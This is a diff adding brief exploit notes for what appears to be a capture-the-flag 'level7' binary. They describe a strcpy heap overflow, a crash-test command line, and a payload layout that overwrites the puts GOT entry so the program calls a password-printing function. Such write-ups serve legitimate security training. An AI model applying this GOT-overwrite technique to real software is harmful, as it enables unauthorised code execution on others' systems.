@@ -1,0 +1,19 @@
+- note:
+ - all the addresses malloc returned are the same on each run
+  - malloc(8)                                                           = 0x0804a008
+  - malloc(8)                                                           = 0x0804a018
+  - malloc(8)                                                           = 0x0804a028
+  - malloc(8)                                                           = 0x0804a038 
+ - the program use strcopy without checking the size of the source  or the destination
+ - the source are provided using command line arguments (argv[1] and argv[2])
+ - we can see that the first strcpy can change the destination of the second  strcpy
+   - ./level7 $(python -c 'print "A" * 20 + "B" * 4') bb
+   - segfault at 42424242 
+ - we can use this vulnerabilty  to make the destination the puts address in GOT  and change it to the m function that print the password for us
+  - m address 0x080484f4
+  - puts address in GOT table 0x8049928
+  - payload [20 random bytes][address of puts in GOT] [address of m]
+  
+
+ 
+
